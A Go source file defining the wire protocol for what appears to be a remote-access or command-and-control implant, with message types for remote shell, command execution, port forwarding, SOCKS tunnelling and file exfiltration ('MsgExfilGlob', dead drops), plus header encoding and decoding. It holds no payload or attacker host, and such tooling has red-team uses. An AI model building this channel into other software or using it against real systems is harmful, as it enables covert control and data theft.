package protocol

import (
	"encoding/binary"
	"fmt"
)

const ProtocolVersion byte = 0x02

const HeaderSize = 8
const MaxPayloadSize = 65535

type MsgType byte

const (
	MsgShellStdin   MsgType = 0x01
	MsgShellStdout  MsgType = 0x02
	MsgShellStderr  MsgType = 0x03
	MsgCmdReq       MsgType = 0x04
	MsgCmdRes       MsgType = 0x05
	MsgFilePut      MsgType = 0x06
	MsgFileGetReq   MsgType = 0x07
	MsgFileGetChunk MsgType = 0x08
	MsgFwdConnect   MsgType = 0x10
	MsgFwdData      MsgType = 0x11
	MsgFwdClose     MsgType = 0x12
	MsgSocksConnect MsgType = 0x13
	MsgSocksData    MsgType = 0x14
	MsgSocksClose   MsgType = 0x15
	MsgPing         MsgType = 0x20
	MsgPong         MsgType = 0x21
	MsgReconnect    MsgType = 0x30
	MsgSessionID    MsgType = 0x31
	MsgModuleList   MsgType = 0x40
	MsgModuleExec   MsgType = 0x41
	MsgModuleResult MsgType = 0x42
	MsgExfilFile    MsgType = 0x50
	MsgExfilGlob    MsgType = 0x51
	MsgExfilAck     MsgType = 0x52
	MsgExfilChunk   MsgType = 0x53
	MsgDeadDrop     MsgType = 0x54
	MsgDeadDropAck  MsgType = 0x55
	MsgCanaryAlert  MsgType = 0x60
	MsgCanaryCheck  MsgType = 0x61
	MsgError        MsgType = 0xFF
)

type Message struct {
	Version  byte
	Type     MsgType
	StreamID uint32
	Payload  []byte
}

func Marshal(m Message) []byte {
	buf := make([]byte, HeaderSize+len(m.Payload))
	buf[0] = ProtocolVersion
	buf[1] = byte(m.Type)
	binary.BigEndian.PutUint32(buf[2:6], m.StreamID)
	binary.BigEndian.PutUint16(buf[6:8], uint16(len(m.Payload)))
	copy(buf[8:], m.Payload)
	return buf
}

func Unmarshal(data []byte) (Message, error) {
	if len(data) >= 7 && data[0] != ProtocolVersion {
		return unmarshalV1(data)
	}
	if len(data) < HeaderSize {
		return Message{}, fmt.Errorf("message too short: %d bytes", len(data))
	}
	plen := int(binary.BigEndian.Uint16(data[6:8]))
	if len(data) < HeaderSize+plen {
		return Message{}, fmt.Errorf("message truncated: need %d, got %d", HeaderSize+plen, len(data))
	}
	return Message{
		Version:  data[0],
		Type:     MsgType(data[1]),
		StreamID: binary.BigEndian.Uint32(data[2:6]),
		Payload:  data[HeaderSize : HeaderSize+plen],
	}, nil
}

func unmarshalV1(data []byte) (Message, error) {
	if len(data) < 7 {
		return Message{}, fmt.Errorf("v1 message too short: %d bytes", len(data))
	}
	plen := int(binary.BigEndian.Uint16(data[5:7]))
	if len(data) < 7+plen {
		return Message{}, fmt.Errorf("v1 message truncated: need %d, got %d", 7+plen, len(data))
	}
	return Message{
		Version:  0x01,
		Type:     MsgType(data[0]),
		StreamID: binary.BigEndian.Uint32(data[1:5]),
		Payload:  data[7 : 7+plen],
	}, nil
}
